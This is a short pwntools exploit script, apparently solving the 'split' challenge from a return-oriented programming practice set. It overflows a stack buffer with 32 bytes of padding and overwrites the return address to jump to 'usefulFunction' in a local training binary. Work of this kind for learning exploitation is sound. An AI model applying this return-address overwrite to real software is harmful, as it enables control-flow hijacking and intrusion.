#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'executable_split')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

useful_location = 0x0000000000400742
rbp_location = 0x000000000040084a

buffer = b'A' * 32 # 32 bytes of padding
buffer += p64(rbp_location) # address on the stack where rbp should return to
buffer += p64(useful_location) # address of usefulFunction to where we overwrite the return address

print(buffer)
io.send(buffer)

io.interactive()
